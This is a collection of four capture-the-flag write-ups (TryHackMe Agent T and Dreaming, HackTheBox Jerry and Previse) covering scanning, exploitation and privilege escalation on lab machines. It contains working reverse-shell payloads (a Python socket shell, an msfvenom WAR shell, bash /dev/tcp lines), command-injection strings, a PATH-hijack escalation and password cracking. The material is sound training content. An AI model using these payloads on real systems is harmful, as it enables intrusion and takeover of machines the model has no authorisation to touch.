[{"content":" Scanning nmap Started with an nmap scan:\nTCP all ports kali@kali:~/ctf/thm/agent_t$ sudo nmap -T4 -p- 10.10.49.137 -oA nmap/tcp_all_ports [sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-14 21:06 EST Nmap scan report for 10.10.49.137 Host is up (0.082s latency). Not shown: 65534 closed tcp ports (reset) PORT STATE SERVICE 80/tcp open http TCP with scripts against found ports kali@kali:~/ctf/thm/agent_t$ sudo nmap -sCV -p80 10.10.49.137 -oA nmap/tcp_def_scripts Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-14 21:07 EST Nmap scan report for 10.10.49.137 Host is up (0.079s latency). PORT STATE SERVICE VERSION 80/tcp open http PHP cli server 5.5 or later (PHP 8.1.0-dev) |_http-title: Admin Dashboard Enumeration Web Page Looks to be a simple Admin Dashboard with nothing really interesting found. There are also a handful of links that lead to non-existent pages.\nsearchsploit kali@kali:~/ctf/thm/agent_t$ searchsploit PHP 8.1.0-dev --------------------------------------------------------- ----------------------- Exploit Title | Path --------------------------------------------------------- ----------------------- ... PHP 8.1.0-dev - \u0026#39;User-Agentt\u0026#39; Remote Code Execution | php/webapps/49933.py ... Found an exploit for the version of PHP that is being used. Can also be found here: https://www.exploit-db.com/exploits/49933\nExploitation Copied the found exploit locally and executed it.\nkali@kali:~/ctf/thm/agent_t$ python3 exploit.py Enter the full host url: http://10.10.49.137/ Interactive shell is opened on http://10.10.49.137/ Can\u0026#39;t acces tty; job crontol turned off. $ whoami root And a interactive shell is given back. The flag can then be found.\nFlag $ cat /flag.txt flag{4127d0530abf16d6...} ","permalink":"https://H3r1CH.github.io/writeups/tryhackme/agent_t/","summary":"agent t","title":"Agent T"},{"content":" Scanning nmap Started with an nmap scan:\nTCP all ports kali@kali:~/ctf/thm/dreaming$ sudo nmap -T4 -p- -oA nmap/tcp_all_ports 10.10.31.54 PORT STATE SERVICE 22/tcp open ssh 80/tcp open http TCP with scripts against found ports kali@kali:~/ctf/thm/dreaming$ sudo nmap -sCV -p22,80 -oA nmap/tcp_def_scripts 10.10.31.54 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 76:26:67:a6:b0:08:0e:ed:34:58:5b:4e:77:45:92:57 (RSA) | 256 52:3a:ad:26:7f:6e:3f:23:f9:e4:ef:e8:5a:c8:42:5c (ECDSA) |_ 256 71:df:6e:81:f0:80:79:71:a8:da:2e:1e:56:c4:de:bb (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.41 (Ubuntu) Enumeration Web Page Found Apache2 Ubuntu Default Page gobuster kali@kali:~/ctf/thm/dreaming$ sudo gobuster dir -u http://10.10.31.54/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.txt /app (Status: 301) [Size: 308] [--\u0026gt; http://10.10.31.54/app/] /app Found pluck-4.7.13/ link that directed to the pluck application In the application it presents a link to the admin loging page as well searchsploit kali@kali:~/ctf/thm/dreaming$ searchsploit pluck 4.7.13 --------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------- --------------------------------- Pluck CMS 4.7.13 - File Upload Remote Code Execution (Authenticated) | php/webapps/49909.py --------------------------------------------------------------------------------- --------------------------------- Found an exploit for the version of Pluck, but needs to be authenticated.\nAuthentication Brute Force Using Burp Suite Intruder the password can be brute forced for the admin user\nIntercepted a Log in request and sent to Intruder Cleared all payload markers then added one only to the cont1 value Set the Attack mode to Sniper and loaded the Seclists 500-worst-passwords.txt file as the Payload option After starting the attack, based on the Status and Length, the password can be identified as password Enter in the found password into the Log In form does in fact give access to the Admin portal of the application Exploitation Copied the found exploit locally and executed it.\nkali@kali:~/ctf/thm/dreaming$ python3 exploit.py 10.10.31.54 80 password \u0026#39;/app/pluck-4.7.13\u0026#39; Authentification was succesfull, uploading webshell Uploaded Webshell to: http://10.10.31.54:80/app/pluck-4.7.13/files/shell.phar A URL is given and when navigating to it presents an interactive webshell as the www-data user Foothold User - lucien Doing some enumeration via the webshell, the file test.py can be found in the /opt directory In that file, there is a password vairable with a value that can be used to login as the lucien user SSH kali@kali:~/ctf/thm/dreaming$ ssh lucien@10.10.31.54 User flag lucien@dreaming:~$ cat lucien_flag.txt THM{TH3_L1BR4R14N} Privilege Escalation User - death sudo -l Running sudo -l as the lucien user show that one file can be executed as the death user\nlucien@dreaming:~$ sudo -l Matching Defaults entries for lucien on dreaming: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User lucien may run the following commands on dreaming: (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py Executing this file just shows output of names and what will be known as their dreams. This file us not readable to the lucien user, so not sure exactly what is happening as of now.\nmysql In the lucien home directory there is also a file .mysql_history which shows some previous mysql commands as well as a potential mysql database password. Using ss, it can be confirmed that there is a mysql server running on the localhost\nlucien@dreaming:~$ ss -tln State Recv-Q Send-Q Local Address:Port Peer Address:Port Process LISTEN 0 151 127.0.0.1:3306 0.0.0.0:* With the found password the database can be connected to:\nlucien@dreaming:~$ mysql -u lucien -plucien42DBPASSWORD Looking at previous command and using SHOW GRANTS; it can be determined that the lucien user can INSERT INTO the dreams table of the library database After some initial testing the lucien user is able to add values to the dreams table to the dreams column and the dream column which is what gets printed out by the getDreams.py file During enumeration it was also identified that there is another getDreams.py file which can be read by the lucien user Looking at the part of the file of what is printing out, there is a subprocess.check_output function being used Searching on \u0026lsquo;python subprocess check exploit\u0026rsquo; finds a knowledge base that gives information on how this function can be exploited https://knowledge-base.secureflag.com/vulnerabilities/code_injection/os_command_injection_python.html Using the below mysql command shows the database password used by the death user which can also be used to log into their account\nmysql\u0026gt; INSERT INTO dreams (dreamer, dream) VALUES (\u0026#39;whoami\u0026#39;, \u0026#39;TEST2; cat /home/death/getDreams.py); lucien@dreaming:~$ su death User flag death@dreaming:~$ cat death_flag.txt THM{1M_TH3R3_4_TH3M} User - morpheus During enumeration it was identified that the shutil.py file had a group ownership by the user death. This can be verified running the command find / -group death 2\u0026gt;/dev/null In the morpheus user home directory there is a restore.py file that makes use of the copy2 function from the shutil.py package. Since the shutil.py file can be written to by the death user, a payload for a reverse shell can be added into the copy2 function. import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;10.6.12.234\u0026#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]); After starting a netcat listener (nc -lvnp 4444) and waiting a minute a reverse shell is returned and now have access as the morpheus user.\nUser Flag morpheus@dreaming:~$ cat morpheus_flag.txt THM{DR34MS_5H4P3_TH3_W0RLD} ","permalink":"https://H3r1CH.github.io/writeups/tryhackme/dreaming/","summary":"dreaming","title":"Dreaming"},{"content":" Scanning nmap Started with an nmap scan:\nTCP all ports kali@kali:~/ctf/htb/machines/jerry$ sudo nmap -T4 -p- 10.10.10.95 -oA nmap/tcp_all_ports Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-13 16:35 EDT Nmap scan report for 10.10.10.95 Host is up (0.018s latency). Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE 8080/tcp open http-proxy TCP with scripts against found ports kali@kali:~/ctf/htb/machines/jerry$ sudo nmap -sCV -p8080 10.10.10.95 -oA nmap/tcp_scripts Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-13 16:37 EDT Nmap scan report for 10.10.10.95 Host is up (0.021s latency). PORT STATE SERVICE VERSION 8080/tcp open http Apache Tomcat/Coyote JSP engine 1.1 |_http-title: Apache Tomcat/7.0.88 |_http-favicon: Apache Tomcat |_http-server-header: Apache-Coyote/1.1 Only one port found, which is 8080 and looks to be an HTTP Apache Tomcat server, so it can be opened in a web browser. Enumeration Web Page Looks to be a default Apache Tomcat page: Using one of the default credentials found, tomcat:s3cret, logging into the Manager App section of the website is easy. Looking further down on the page, it looks like a WAR file can be uploaded and deployed to the server. Exploitation Knowing that it takes a war file, a war file reverse shell can be created to upload and attempted to execute\nFile Upload Created the reverse shell war file using msfvenom\nkali@kali:~/ctf/htb/machines/jerry$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war \u0026gt; reverse.war Now to upload the war file. After selecting the Deploy button it can now be seen in the Path column under Applications: Reverse Shell Now to start a netcat listener to catch the reverse shell after executing it:\nkali@kali:~/ctf/htb/machines/jerry$ nc -lvnp 4444 listening on [any] 4444 ... After selecting the /reverse path link from the Path column under Applications, a reverse shell is returned as the nt authority\\system user:\nconnect to [10.10.14.5] from (UNKNOWN) [10.10.10.95] 49192 Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. C:\\apache-tomcat-7.0.88\u0026gt; C:\\apache-tomcat-7.0.88\u0026gt;whoami whoami nt authority\\system C:\\apache-tomcat-7.0.88\u0026gt;hostname hostname JERRY Flags With access as nt authority\\system, no privilege escalation is needed, and both flags can be retrieved:\nC:\\Users\\Administrator\\Desktop\\flags\u0026gt;type \u0026#34;2 for the price of 1.txt\u0026#34; type \u0026#34;2 for the price of 1.txt\u0026#34; user.txt 7004dbcef0f854e0... root.txt 04a8b36e1545a455... ","permalink":"https://H3r1CH.github.io/writeups/hackthebox/jerry/","summary":"jerry","title":"Jerry"},{"content":" Scanning nmap Started with an nmap scan:\nTCP all ports kali@kali:~/ctf/htb/machines/previse$ sudo nmap T4 -p- 10.10.11.104 -oA nmap/tcp_all_ports [sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-13 17:56 EDT Failed to resolve \u0026#34;T4\u0026#34;. Nmap scan report for 10.10.11.104 Host is up (0.022s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http TCP with scripts against found ports kali@kali:~/ctf/htb/machines/previse$ sudo nmap -sCV -p22,80 10.10.11.104 -oA nmap/tcp_scripts [sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-13 18:17 EDT Nmap scan report for 10.10.11.104 Host is up (0.019s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-title: Previse Login |_Requested resource was login.php | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Enumeration Web Page Opening up the web page it looks to be a generic Login form for a File Storage site. The login.php shows that the site is running on PHP. gobuster When navigating to the web page it shows that that PHP is being used so that can be added to an extension type for the directory busting.\nkali@kali:~/ctf/htb/machines/previse$ sudo gobuster dir -u http://10.10.11.104/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php -o gobuster_80 -q /index.php (Status: 302) [Size: 2801] [--\u0026gt; login.php] /download.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /login.php (Status: 200) [Size: 2224] /files.php (Status: 302) [Size: 4914] [--\u0026gt; login.php] /header.php (Status: 200) [Size: 980] /nav.php (Status: 200) [Size: 1248] /footer.php (Status: 200) [Size: 217] /css (Status: 301) [Size: 310] [--\u0026gt; http://10.10.11.104/css/] /status.php (Status: 302) [Size: 2966] [--\u0026gt; login.php] /js (Status: 301) [Size: 309] [--\u0026gt; http://10.10.11.104/js/] /logout.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /accounts.php (Status: 302) [Size: 3994] [--\u0026gt; login.php] /config.php (Status: 200) [Size: 0] /logs.php (Status: 302) [Size: 0] [--\u0026gt; login.php] /server-status (Status: 403) [Size: 277] Looks like a lot of files are redirecting back to the login.php page hinting at needing credentials.\n/nav.php page On the nav.php page, each link can be intercepted using Burp Suite, to see what can be done with the requests. When selecting the CREATE ACCOUNT link, the below request is made: When intercepting the response to this request, there is a 302 response is returned and some page data can be seen. Modifying the 302 to a 200, allows access to account.php where a new account can be created. /accounts.php After creating a new account, and then logging into that account, additional enumeration can be done.\n/status.php The status.php page reveals that the web site is using a MySQL server, that there are two registered admins, and one file has been uploaded. /files.php The files.php page shows an upload field and the file that have been uploaded. After downloading and extracting the SITEBACKUP.ZIP file a new page called file_logs.php is identified.\n/file_logs.php When navigating to that page log data can be requested where the file delimiter can be specified from a drop down. After selecting SUBMIT and intercepting the request, the below request is captured, with a delim variable and parameter set. Exploitation (Command Injection) When testing for command injection against the delim parameter it is possible to send a request from the target machine.\nPython Web Server Started a web server to try an catch a request from the target.\nkali@kali:~/ctf/htb/machines/previse/siteBackup1$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... Burp request Modifying the request to send a curl request to our attack machine. And it can be seen that the request is made to the Python web server.\nkali@kali:~/ctf/htb/machines/previse/siteBackup1$ python3 -m http.server Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 10.10.11.104 - - [13/Aug/2022 19:47:48] \u0026#34;GET / HTTP/1.1\u0026#34; 200 - Reverse Shell Now to create a reverse shell file to host via the Python web server and use curl again to get a reverse shell.\nkali@kali:~/ctf/htb/machines/previse$ echo \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.5/4444 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt; revshell.sh Started a netcat listener:\nkali@kali:~/ctf/htb/machines/previse$ nc -lvnp 4444 listening on [any] 4444 ... Modify the Burp request again to download and execute the revshell.sh file And a reverse shell is returned as the www-data user:\nconnect to [10.10.14.5] from (UNKNOWN) [10.10.11.104] 49900 bash: cannot set terminal process group (1399): Inappropriate ioctl for device bash: no job control in this shell www-data@previse:/var/www/html$ www-data@previse:/var/www/html$ whoami www-data www-data@previse:/var/www/html$ hostname previse Shell upgrade:\nwww-data@previse:/var/www/html$ python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; www-data@previse:/var/www/html$ export TERM=xterm Privilege Escalatoin m4lwhere user Database Looking in the config.php file there are credentials to a database:\nwww-data@previse:/var/www/html$ cat config.php \u0026lt;?php function connectDB(){ $host = \u0026#39;localhost\u0026#39;; $user = \u0026#39;root\u0026#39;; $passwd = \u0026#39;mySQL_p@ssw0rd!:)\u0026#39;; $db = \u0026#39;previse\u0026#39;; $mycon = new mysqli($host, $user, $passwd, $db); return $mycon; } ?\u0026gt; Connecting to the database and viewing its data:\nwww-data@previse:/var/www/html$ mysql -h localhost -u root -p\u0026#39;mySQL_p@ssw0rd!:)\u0026#39; mysql\u0026gt; show databases; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | previse | | sys | +--------------------+ mysql\u0026gt; use previse; mysql\u0026gt; show tables; show tables; +-------------------+ | Tables_in_previse | +-------------------+ | accounts | | files | +-------------------+ mysql\u0026gt; select * from accounts; +----+----------+------------------------------------+---------------------+ | id | username | password | created_at | +----+----------+------------------------------------+---------------------+ | 1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 | | 2 | tester | $1$🧂llol$UfA76/dcHlnMNoOlgyaZq1 | 2022-08-13 23:23:06 | +----+----------+------------------------------------+---------------------+ The database shows a couple accounts, including m4lwhere, who is the only user on the machine. Now to crack the password hash for the m4lwhere user.\nPassword Crack Copying the hash to a file called hash.txt and running hashcat against it to crack it. The password looks to be a md5crypt (based on https://hashcat.net/wiki/doku.php?id=example_hashes)\nkali@kali:~/ctf/htb/machines/previse$ hashcat -m 500 hash.txt /usr/share/wordlists/rockyou.txt ... $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235! SSH Now with the cracked password hash, the m4lwhere user can be logged into over SSH.\nkali@kali:~/ctf/htb/machines/previse$ ssh m4lwhere@10.10.11.104 m4lwhere@10.10.11.104\u0026#39;s password: ilovecody112235! And a shell as the m4lwhere user is gained:\nWelcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sun Aug 14 00:31:06 UTC 2022 System load: 0.0 Processes: 180 Usage of /: 51.3% of 4.85GB Users logged in: 0 Memory usage: 28% IP address for eth0: 10.10.11.104 Swap usage: 0% 0 updates can be applied immediately. Last login: Fri Jun 18 01:09:10 2021 from 10.10.10.5 m4lwhere@previse:~$ whoami m4lwhere m4lwhere@previse:~$ id uid=1000(m4lwhere) gid=1000(m4lwhere) groups=1000(m4lwhere) m4lwhere@previse:~$ hostname previse user.txt m4lwhere@previse:~$ cat user.txt 652e288e09fd164a... root sudo -l Checking the sudo privileges the m4lwhere has:\nm4lwhere@previse:~$ sudo -l [sudo] password for m4lwhere: User m4lwhere may run the following commands on previse: (root) /opt/scripts/access_backup.sh Looking at the script that can be run with root privileges:\nm4lwhere@previse:~$ cat /opt/scripts/access_backup.sh #!/bin/bash # We always make sure to store logs, we take security SERIOUSLY here # I know I shouldnt run this as root but I cant figure it out programmatically on my account # This is configured to run with cron, added to sudo so I can run as needed - we\u0026#39;ll fix it later when there\u0026#39;s time gzip -c /var/log/apache2/access.log \u0026gt; /var/backups/$(date --date=\u0026#34;yesterday\u0026#34; +%Y%b%d)_access.gz gzip -c /var/www/file_access.log \u0026gt; /var/backups/$(date --date=\u0026#34;yesterday\u0026#34; +%Y%b%d)_file_access.gz It looks like the gzip command is using the date command without specifying the full path. So it should be possible to create a malicious date file, add that to the beginning of the m4lwhere user\u0026rsquo;s PATH, and have it executed within the access_backup.sh script as root.\nm4lwhere@previse:~$ echo \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.5/4444 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt; date m4lwhere@previse:~$ cat date bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.5/4444 0\u0026gt;\u0026amp;1 m4lwhere@previse:~$ chmod +x date m4lwhere@previse:~$ export PATH=/home/m4lwhere/:$PATH Started a netcat listener:\nkali@kali:~/ctf/htb/machines/previse$ nc -lvnp 4444 listening on [any] 4444 ... Executed the access_backup.sh script with sudo:\nm4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh And the reverse shell returns with root access:\nconnect to [10.10.14.5] from (UNKNOWN) [10.10.11.104] 50360 root@previse:~# root@previse:~# whoami whoami root root@previse:~# id id uid=0(root) gid=0(root) groups=0(root) root@previse:~# hostname hostname previse root.txt root@previse:/root# cat root.txt cat root.txt a01417a61ab18617... ","permalink":"https://H3r1CH.github.io/writeups/hackthebox/previse/","summary":"previse","title":"Previse"}]